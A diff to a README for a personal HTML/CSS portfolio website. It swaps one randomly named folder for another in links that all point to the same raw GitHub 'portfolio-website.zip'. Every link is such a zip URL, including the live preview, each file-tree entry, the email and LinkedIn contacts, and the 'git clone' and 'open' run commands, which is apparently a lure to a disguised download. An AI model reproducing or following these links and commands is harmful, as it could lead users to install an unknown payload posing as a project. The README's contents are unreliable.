@@ -4,7 +4,7 @@ This is my personal developer portfolio website built using **HTML**, **CSS**, a
 
 ## 📍 Live Preview
 
-👉 [Visit My Portfolio](https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip)
+👉 [Visit My Portfolio](https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip)
 
 ---
 
@@ -12,17 +12,17 @@ This is my personal developer portfolio website built using **HTML**, **CSS**, a
 
 ```
 📦 portfolio-website
- ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
- ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
- ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
+ ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
+ ┣ 📄 https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
  ┣ 📁 images/
- ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
- ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
- ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
- ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
- ┃ ┗ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
+ ┃ ┣ https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
+ ┃ ┗ https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
  ┣ 📁 assets/
- ┃ ┗ https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+ ┃ ┗ https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
 ```
 
 ---
@@ -52,17 +52,17 @@ This is my personal developer portfolio website built using **HTML**, **CSS**, a
 
 Feel free to connect with me:
 
-- 📧 Email: https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip  
-- 💼 LinkedIn: [https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip](https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip)
+- 📧 Email: https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip  
+- 💼 LinkedIn: [https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip](https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip)
 
 ---
 
 ## 🚀 How to Run Locally
 
 ```bash
-git clone https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+git clone https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
 cd portfolio-website
-open https://raw.githubusercontent.com/pooja819/portfolio-website/main/unturpentined/portfolio-website.zip
+open https://raw.githubusercontent.com/pooja819/portfolio-website/main/graphometrical/portfolio-website.zip
 ```
 
 ---
